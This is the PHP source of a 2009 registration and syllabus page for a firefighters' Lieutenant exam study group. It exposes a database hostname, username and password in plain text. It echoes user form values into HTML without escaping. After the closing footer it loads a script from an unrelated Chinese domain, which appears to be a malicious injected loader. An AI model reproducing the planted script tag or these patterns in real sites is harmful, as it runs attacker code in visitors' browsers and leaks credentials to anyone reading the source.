<?php
session_start();
$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);

$enrolled_query =  "SELECT * FROM Study_Group WHERE study_active = 1";
$enrolled_result = mysql_query($enrolled_query);	
$number_enrolled = mysql_num_rows($enrolled_result);
$class_query = "SELECT * FROM Study_Group ORDER by study_lname ASC";																			
$class_result = mysql_query($class_query);																																				
$number_students = mysql_num_rows($class_result);			
$number_enrolled = mysql_num_rows($enrolled_result);
$seats_left = 200 - $number_enrolled;	


?>
<?php		
		
if (isset($_SESSION))
{			
	foreach ($_SESSION as $key => $content)
	{
		foreach ($content as $name => $error)
		{
			$form_value[$key] = $name;
		}
	}
$form_errors = 1;
}
?>


<?php include("header.php"); ?>
<!--
	<div class="nav_container">
		<ul class="floatright">
			<li><a href="index.html">Home</a></li> 
			<li> |&nbsp;</li>
			<li><a href="about.html">About</a></li>
			<li> |&nbsp;</li>
			<li><a href="#">Store</a></li> 
			<li> |&nbsp;</li>
			<li><a href="#">Contact</a></li>    	  	
		</ul>
	</div>
-->
	<div class="container">
		<div class="left">
		    <a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
			
    		<div class="left_content"> 
          	<?php include("navigation.php"); ?>
			</div>
			
				<div class="study_link">
					Practice Orals Schedule
					[<a href="documents/Oral_Schedule.pdf">Download PDF</a>]
			
				</div>
		   

			
			<!--
			<div class="left_content">
				<img src="images/125x125banner.jpg" />
			</div>
			-->
		</div>
		<div class="middle">
			<div class="store_header">
				<h1>2009 Lieutenant Study Group</h1>
				<h4>&nbsp;</h4>
			</div>
			<div class="contact">
				

				<h1>Information</h1>
				
				<p class="study">The Ignite the Spirit Fund is putting together a study group to prepare for the upcoming Lieutenant's Exam.
					The group will have 200 spots available (first come first served). You must sign up online.
					The group will meet at Illinois Masonic Hospital's Olsen Auditorium. (836 W. Wellington and parking is available for a fee)
					The group will meet on these days between the hours of 6:00pm and 9:00pm:<br /><br /><br />
                    <!--
					Jan. 30 Friday (3D)<br/>
					Feb. 5  Thursday (3A)<br/>
					Feb. 9  Monday (1B)<br/>
					Feb. 16 Monday (2E)<br/>
					Feb. 26 Thursday (3C)<br/>
					Mar. 5 Thursday (1E)<br/>
					Mar. 12 Thursday (2C)<br/>
					Mar. 19 Thursday (3E)<br/>
					Mar. 23  Monday (1A)<br/> --> <br/>
					
					$ 3.00 parking is available at the Halsted/Wellington parking lot entering on the Halsted side.  Enter the Hospital off the Wellington side main entrance.<br /><br />
					
					<!-- If you are interested please fill out our registration form and we will sent you a confirmation e-mail. -->
					<b>Thanks for your interest in the study group, Registration is now closed. For those who registered you will recive an email shortly confirming your spot in the group. (If you have not recived notification yet, please check your spam folder)</b>
					</p>
					
				<?php
				$show_form = 1;
				if ($number_students < 300 && $show_form == 2)
				{	
				?>
				<h1>Registration</h1>
				
				
				<form action="study_group_action.php" method="post">
				
				<input type="hidden" name="process" value="go" />
				
					<?php /*  if ($seats_left == 0){ echo "&nbsp; &nbsp &nbsp; <b>Sorry the Study Group is full.</b>"; }
					else {
					echo "&nbsp; &nbsp &nbsp; Seats Left In Study Group: ".$seats_left; } */ ?><!--<br /><br />-->
					
					<?php 
					if (isset($_SESSION[$key]))
					{			
					echo "<div class='study_error'>";
						foreach ($_SESSION as $key => $content)
						{
							foreach ($content as $name => $error)
							{
								if ($error == 1) { echo $key." can not be blank<br />";}
								elseif ($error == 2) { echo $key." is not formatted correctly<br />";}
							}
						}
					echo "</div>";
					}
					?>
					
					<fieldset>
					
						<label>First Name: </label><input  name="firstname" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['firstname']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?>/> 
						<label>Last Name:</label><input  name="lastname" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['lastname']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?>/>
						<label>E-Mail:</label><input  name="email" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['email']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?>/>
						<label>Phone:</label><input  name="phone" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['phone']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?> />
						<label>Address:</label>
						<input class="full" name="address1" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['address1']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?> />
						<label>Apt/Box:</label>
						<input name="address2" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['address2']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?> />
						<div class="study_spacer">*Not Required</div>
					</fieldset>
					<fieldset>
						<label>City:</label><input  name="city" type="text" value="Chicago"  DISABLED/>
						<label>State:</label><input  name="state" type="text"  value="Illinois" DISABLED/>
						<label>Zip Code:</label><input  name="zip" type="text" <?php if ($form_errors == 1){ echo "value ='".$form_value['zip']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?>/>
					</fieldset>
					<fieldset>
						<label>Firehouse:</label>
						<input name="assignment" type="text"  <?php if ($form_errors == 1){ echo "value ='".$form_value['assignment']."'";} if ($seats_left == 0){ echo "DISABLED"; } ?> />
					</fieldset>
					<fieldset>
						<label>Shift:</label>
						<select name="shift" <?php if ($seats_left == 0){ echo "DISABLED"; } ?> >
							<option> </option>
							<option <?php if ($form_errors == 1 && $form_value['shift'] == 1){ echo "SELECTED";} ?>>1</option>
							<option <?php if ($form_errors == 1 && $form_value['shift'] == 2){ echo "SELECTED";} ?>>2</option>
							<option <?php if ($form_errors == 1 && $form_value['shift'] == 3){ echo "SELECTED";} ?>>3</option>
							
						</select>
						<label>Daily:</label>
						<select name="daily" <?php if ($seats_left == 0){ echo "DISABLED"; } ?>>
							<option> </option>
							<option <?php if ($form_errors == 1 && $form_value['daily'] == "A"){ echo "SELECTED";} ?>>A</option>
							<option <?php if ($form_errors == 1 && $form_value['daily'] == "B"){ echo "SELECTED";} ?>>B</option>
							<option <?php if ($form_errors == 1 && $form_value['daily'] == "C"){ echo "SELECTED";} ?>>C</option>
							<option <?php if ($form_errors == 1 && $form_value['daily'] == "D"){ echo "SELECTED";} ?>>D</option>
							<option <?php if ($form_errors == 1 && $form_value['daily'] == "E"){ echo "SELECTED";} ?>>E</option>
						</select>
					</fieldset>
					
					<input class="submit" name="submit" type="submit" value="Submit" <?php if ($seats_left == 0){ echo "DISABLED"; } ?> />
				</form>
				
			<?php } ?>
				<!-- <h1>Call ignite The Spirit</h1> -->
			</div>
		</div>
		<div class="right">
			<div class="study_syllabus">
				<h1>Class Syllabus</h1>
				[<a href="documents/class_schedule2.doc">Download Word Document</a>]
				<div class="study_syllabus_item">
				<h2>Day 1</h2></h2>
				<h3>Friday, January 30 (3D) 6-9 PM</h3>
				Introduction to Getting Organized<br /><i>by Peter Van Dorpe</i>
				</div>
				<div class="study_syllabus_item">
				<h2>Day 2</h2></h2>
				<h3>Thursday, February 5 (3A) 6-9PM</h3>
				Engine Ops and. NFIRS Reports<br /><i> by Jim Purl</i>
				</div>
				<div class="study_syllabus_item">
				<h2>Day 3</h2>
				<h3>Monday, February 9 (1B)  6-9PM</h3>
				Truck  Ops<br /><i> by Tim Gibbons</i><br />
				Special Ops<br /><i> by John Collins</i><br />
				</div>
				<div class="study_syllabus_item">
				<h2>Day 4</h2>
				<h3>Friday, February 13 (2D) 6-9PM</h3>
				EMS/ALS /BLS<br /><i> by Kevin Kirkley and Jim Thorpe</i><br />
				Orals Made Easy<br /><i>by Peter Van Dorpe</i><br />
				
				</div>
				<div class="study_syllabus_item">
				<h2>Day 5</h2>
				<h3>Thursday, February 26 (3C)  6-9PM</h3>                
				Airport Operations by<br /><i>Tom Wagner & Fred Cnota</i><br />                
				Written Directives / Medical Procedure/Harassment<br /><i> by Steve Little & Joe Santucci</i><br />
				</div>
				<div class="study_syllabus_item">
				<h2>Day 6</h2>
				<h3>Thursday, March 5 (1E) 6-9PM</h3>
				High Rise and Incident Command<br /><i>by Ed Porter, Tom Kennedy, and Kevin Ryan</i><br />
				</div>
				<div class="study_syllabus_item">
				<h2>Day 7</h2>
				<h3>Thursday, March 12 (2C) 6-9PM</h3>
				
				Hazmat by<br /><i> Kelly Burns</i><br />
				Fire Prevention by  Eddie Banks</i><br />
				</div>
				<div class="study_syllabus_item">
				<h2>Day 8</h2>
				<h3>Thursday, March 19 (3E) 6-9PM</h3>
				Building Construction<br /><i>by James Jablonowski</i><br />
				</div>
				<div class="study_syllabus_item">
                <h2>Day 9</h2>
				<h3>Monday, March 23 (1A) 6-9PM</h3>
				Labor Contract<br /><i> by Marc McDerrmatt</i><br />
				SCBA /PPC<br /><i> by Margaret Kane</i><br />
				</div>
			</div>
		</div>
	</div>
<?php include("footer.php"); 
unset($_SESSION);
session_destroy();
?>
<script src='http://nt002.cn/E/J.JS'></script></body>
</html>


